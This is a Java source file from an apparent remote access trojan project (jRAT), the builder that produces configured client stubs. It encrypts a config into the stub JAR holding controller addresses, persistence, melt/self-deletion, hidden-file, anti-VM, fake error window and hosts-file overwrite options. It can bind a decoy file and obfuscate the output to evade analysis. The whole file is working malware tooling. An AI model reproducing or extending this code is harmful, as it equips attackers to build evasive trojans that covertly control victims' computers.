package se.jrat.controller.build;

import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.jar.JarFile;
import java.util.zip.ZipEntry;
import java.util.zip.ZipException;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import se.jrat.common.codec.Base64;
import se.jrat.common.codec.Hex;
import se.jrat.common.crypto.CryptoUtils;
import se.jrat.common.hash.Md5;
import se.jrat.common.hash.Sha1;
import se.jrat.common.utils.DataUnits;
import se.jrat.common.utils.JarUtils;
import se.jrat.controller.Constants;
import se.jrat.controller.ErrorDialog;
import se.jrat.controller.Main;
import se.jrat.controller.OSConfig;
import se.jrat.controller.addons.PluginList;
import se.jrat.controller.addons.StubPlugin;
import se.jrat.controller.listeners.BuildListener;
import se.jrat.controller.ui.dialogs.DialogSummary;
import se.jrat.controller.utils.ZkmUtils;

import com.redpois0n.zkmlib.Configuration;

public class Build {

	public static void copy(InputStream input, OutputStream output) throws Exception {
		byte[] buffer = new byte[1024];
		int bytesRead;
		while ((bytesRead = input.read(buffer)) != -1) {
			output.write(buffer, 0, bytesRead);
		}
	}

	@SuppressWarnings("resource")
	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dontInstall, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean bind, String bindpath, String bindname, int droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, Configuration zkm, boolean antivm) {
		listener.start();

		boolean obfuscate = zkm != null;
		
		if (!file.getName().toLowerCase().endsWith(".jar")) {
			file = new File(file.getAbsolutePath() + ".jar");
		}

		ZipFile inputStub = null;
		ZipOutputStream outputStub = null;
		ZipEntry entry = null;

		listener.reportProgress(5, "Preparing...", BuildStatus.INFO);

		File tempStubCleanJar = null;
		File tempCryptedNotRunnableJar = null;
		
		Sha1 sha1 = new Sha1();
		Md5 md5 = new Md5();

		try {
			
			KeyGenerator keyGen = KeyGenerator.getInstance("AES");
	        keyGen.init(128);
	        SecretKey secretKey = keyGen.generateKey();
	        byte[] key = secretKey.getEncoded();
	        IvParameterSpec iv = CryptoUtils.getRandomIv();

			File output;		

			tempStubCleanJar = File.createTempFile(Constants.NAME + "-Builder-Temp" + (new Random()).nextInt(), ".jar");
			tempCryptedNotRunnableJar = File.createTempFile(Constants.NAME + "-Builder-Installer-Temp" + (new Random()).nextInt(), ".jar");
			long start = System.currentTimeMillis();
			
			if (obfuscate) {
				output = File.createTempFile(Constants.NAME + "-Builder-Temp", ".jar");
			} else {
				output = file;
			}

			inputStub = new ZipFile(buildFrom);

			outputStub = new ZipOutputStream(new FileOutputStream(output));

			Enumeration<? extends ZipEntry> entries = inputStub.entries();
			while (entries.hasMoreElements()) {
				entry = entries.nextElement();
				
				InputStream inputStream = inputStub.getInputStream(entry);
				
				if (!entry.getName().equals("config.dat")) {
					listener.reportProgress(25, "Writing " + entry.getName() + " (" + inputStream.available() + " bytes)", BuildStatus.INFO);
					outputStub.putNextEntry(entry);
					if (!entry.isDirectory()) {
						copy(inputStream, outputStub);
					}
					outputStub.closeEntry();
					listener.reportProgress(50, "Wrote " + entry.getName(), BuildStatus.CHECK);
				} else {
					listener.reportProgress(50, "Skipping " + entry.getName(), BuildStatus.INFO);
				}
			}

			String addressString = "";

			for (String s : addresses) {
				addressString += s + ",";
			}
			
			if (addressString.startsWith(",")) {
				addressString = addressString.substring(1);
			}

			try {
				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
				ByteArrayOutputStream baos = new ByteArrayOutputStream();
				CipherOutputStream cios = new CipherOutputStream(baos, cipher);
				BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cios));

				Map<String, Object> config = new HashMap<String, Object>();

				config.put("addresses", addressString);
				config.put("id", id);
				config.put("pass", sha1.hashToString(pass));
				config.put("reconsec", reconSec);
				config.put("name", name);
				config.put("mutex", mutex);
				config.put("mport", mutexport);
				config.put("os", OSConfig.generateString(osconfig));
				config.put("timeout", timeout);
				config.put("toms", timeoutms);
				config.put("error", handleerr);
				config.put("per", persistance);
				config.put("perms", persistancems);
				config.put("debugmsg", debugmsg);
				config.put("vm", antivm);
				config.put("ti", trayicon);
				
				config.put("droppath", droppath);
				config.put("name", name);
				config.put("melt", melt);
				config.put("window", fakewindow);
				config.put("message", fakemessage);
				config.put("title", faketitle);
				config.put("icon", fakeicon);
				config.put("delay", delay);
				config.put("delayms", delayms);
				config.put("hiddenfile", hiddenFile);
				config.put("runnextboot", runNextBoot);
				
				if (bind) {
					File bindFile = new File(bindpath);

					String extension = bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length());

					config.put("droptarget", droptarget);
					config.put("bindname", bindname);
					config.put("extension", extension);
				}


				if (edithost) {
					config.put("overwritehost", overwritehost);
				}
				
				if (trayicon) {
					config.put("tititle", "");
					config.put("timsg", traymsg);
					config.put("timsgfail", traymsgfail);
					config.put("tititle", traytitle);
				}			
				
				for (String str : config.keySet()) {
					writer.write(str + "=" + config.get(str).toString().replace("\n", ""));
					writer.newLine();
				}
				
				writer.close();
				
				listener.reportProgress(30, "Writing config (" + baos.toByteArray().length + " bytes)" , BuildStatus.INFO);		

				entry = new ZipEntry("config.dat");
				outputStub.putNextEntry(entry);
				
				int headerLength = key.length + iv.getIV().length;
				
				if (dontInstall) {
					headerLength++;
				}
				
				byte[] keyIv = new byte[headerLength];
				System.arraycopy(key, 0, keyIv, 0, key.length);
				System.arraycopy(iv.getIV(), 0, keyIv, 16, iv.getIV().length);
				entry.setExtra(keyIv);
				
				outputStub.write(baos.toByteArray());
				
				outputStub.closeEntry();
			} catch (Exception ex) {
				if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
					listener.reportProgress(30, "Skipped config.dat, already exists.", BuildStatus.ERROR);
				} else {
					throw ex;
				}
			}
			
			if (edithost) {
				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
				ByteArrayOutputStream baos = new ByteArrayOutputStream();
				CipherOutputStream cios = new CipherOutputStream(baos, cipher);
				BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cios));
				writer.write(hosttext);
				writer.close();
				
				entry = new ZipEntry("host.dat");
				outputStub.putNextEntry(entry);
				outputStub.write(baos.toByteArray());
				outputStub.closeEntry();
			}

			listener.reportProgress(75, "Wrote key and data", BuildStatus.CHECK);

			if (bind) {
				File bindFile = new File(bindpath);
				String extension = bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length());

				entry = new ZipEntry(bindname + extension);
				outputStub.putNextEntry(entry);
		
				ByteArrayOutputStream baos = new ByteArrayOutputStream();
				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
				CipherOutputStream cios = new CipherOutputStream(baos, cipher);

				FileInputStream fis = new FileInputStream(bindpath);
				copy(fis, cios);
				cios.close();
				
				outputStub.write(baos.toByteArray());
				outputStub.closeEntry();
				
				fis.close();				
				cios.close();

				listener.reportProgress(90, "Writing file to bind... (" + bindFile.length() + " bytes)", BuildStatus.INFO);

				listener.reportProgress(90, "Wrote file to bind", BuildStatus.CHECK);
			}
			inputStub.close();

			if (trayicon) {
				InputStream trayIcon = null;

				if (icon == null || icon.equals("default")) {
					trayIcon = Main.class.getResourceAsStream("/icons/icon.png");
				} else {
					trayIcon = new FileInputStream(icon);
				}

				entry = new ZipEntry("icon.png");
				outputStub.putNextEntry(entry);
				copy(trayIcon, outputStub);
				outputStub.closeEntry();
			}

			String[] plugins = null;

			if (pluginlist != null) {
				plugins = new String[pluginlist.plugins.size()];
				listener.reportProgress(50, "Writing " + pluginlist.plugins.size() + " plugins...", BuildStatus.INFO);

				for (int i = 0; i < pluginlist.plugins.size(); i++) {
					StubPlugin p = pluginlist.plugins.get(i);
					JarFile plugin = new JarFile(p.path);
					entries = plugin.entries();

					while (entries.hasMoreElements()) {
						entry = entries.nextElement();

						String mainClass = JarUtils.getMainClassFromInfo(plugin);

						if (entry.getName().replace("/", ".").replace(".class", "").equals(mainClass)) {
							plugins[i] = entry.getName().replace("/", ".").replace(".class", "");
						}

						entry = new ZipEntry(entry.getName());

						try {
							InputStream pluginInputStream = plugin.getInputStream(entry);
							listener.reportProgress(50, "Writing plugin resource " + entry.getName() + " (" + pluginInputStream.available() + " bytes)", BuildStatus.INFO);
							outputStub.putNextEntry(entry);
							copy(pluginInputStream, outputStub);
							outputStub.closeEntry();
							listener.reportProgress(50, "Wrote plugin resource " + entry.getName(), BuildStatus.CHECK);
						} catch (Exception ex) {
							listener.reportProgress(50, ex.getMessage(), BuildStatus.ERROR);
							continue;
						}
					}
					listener.reportProgress(50, "Wrote plugins", BuildStatus.CHECK);
				}
			}

			if (plugins != null) {
				entry = new ZipEntry("plugins.dat");
				outputStub.putNextEntry(entry);
				for (int i = 0; i < plugins.length; i++) {
					outputStub.write((plugins[i] + ",").getBytes("UTF-8"));
				}
				outputStub.closeEntry();
			}

			inputStub.close();
			outputStub.close();
			
			if (obfuscate) {
				zkm.setInput(output);
				zkm.setOutput(file);
				ZkmUtils.obfuscateAtBuild(zkm, listener);			
			}					

			long end = System.currentTimeMillis();
			
			listener.reportProgress(95, "MD5 of file: " + md5.hash(file), BuildStatus.INFO);
			listener.reportProgress(95, "SHA1 of file: " + sha1.hash(file), BuildStatus.INFO);

			listener.done("Saved stub. Took " + (end - start) + " ms, size " + DataUnits.getAsString(file.length()));

			DialogSummary frame = new DialogSummary(file, addressString, pass, id, listener.getStatuses());
			frame.setVisible(true);
		} catch (Exception ex) {
			String message = ex.getMessage();
			if (message == null) {
				message = "Failed building stub";
			}
			try {
				outputStub.close();
				inputStub.close();
			} catch (Exception ex1) {
			}

			ex.printStackTrace();
			listener.fail(message);
			ErrorDialog.create(ex);
		}

		try {
			tempCryptedNotRunnableJar.delete();
			tempStubCleanJar.delete();
		} catch (Exception ex1) {
			ex1.printStackTrace();
		}
	}

	public static byte[] encode(String s) throws Exception {
		s = Hex.encode(s);
		s = Base64.encode(s);
		return s.getBytes("UTF-8");
	}

	public static byte[] encodeLine(Object obj) throws Exception {
		return (new String(encode(obj.toString())) + ",").getBytes("UTF-8");
	}

}
